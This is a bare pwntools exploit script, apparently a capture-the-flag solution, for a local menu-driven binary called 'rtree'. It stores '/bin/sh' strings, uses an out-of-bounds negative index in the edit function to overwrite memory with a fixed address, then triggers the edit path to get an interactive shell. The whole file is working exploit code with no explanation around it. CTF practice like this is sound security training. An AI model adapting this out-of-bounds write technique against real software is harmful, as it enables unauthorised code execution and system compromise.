from pwn import *

context(os="linux", arch="amd64", log_level="debug")
p = process("./rtree")


def add(key, size, data):
    p.sendlineafter(">> \n", "1")
    p.sendlineafter("key:\n", str(key))
    p.sendlineafter("of the data:\n", str(size))
    p.sendafter("enter the data:\n", data)


def edit(key, idx, data):
    p.sendlineafter(">> \n", "3")
    p.sendlineafter("want to edit:\n", str(key))
    p.sendlineafter("the index of the data you want to edit:\n", str(idx))
    p.sendafter("data:\n", data)


add(1, 0x10, "/bin/sh\x00" + "a" * 8)
add(32, 0x100, "/bin/sh\x00" + "a" * 8)
edit(32, -0x68, p64(0x4010E0))
p.sendlineafter(">> \n", "3")
p.sendlineafter("please enter the key of the node you want to edit:\n", str(1))
p.interactive()
